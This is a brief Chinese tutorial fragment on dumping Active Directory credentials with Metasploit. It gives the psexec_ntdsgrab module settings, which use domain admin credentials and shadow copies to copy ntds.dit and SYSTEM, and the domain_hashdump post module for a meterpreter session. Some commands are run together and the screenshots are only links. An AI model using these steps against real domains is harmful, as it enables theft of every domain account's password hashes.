\*\*MSF中的psexec\_ndtsgrab模块：

①该脚本会使用卷影拷贝服务，将ntds.dit和SYSTEM文件复制到xxx目录下

  

②实际用法：

*   
*   
*   
*   
*   
*   

```
use auxiliary/admin/smb/psexec_ntdsgrabset rhosts 目标ipset SMBDomain 域名set SMBUser 域管用户名set SMBPass 域管密码exploit
```

![](../Images/ffe400e2ca4cda11ad2156241976f617.png)

  

执行完成会给出ntds.dit和SYSTEM文件的保存路径，移动到当前目录即可

![](../Images/e241ccf29c1fde9dd12a9632ffca9de5.png)

①首先我们需要一个域管理员的meterpreter会话

![](../Images/7e4342b21f67d3980172fd352d397148.png)

*   
*   

```
run post/windows/gather/credentials/domain_hashdumpexploit
```

![](../Images/0b455caebf79c262e92c6139b6099e51.png)
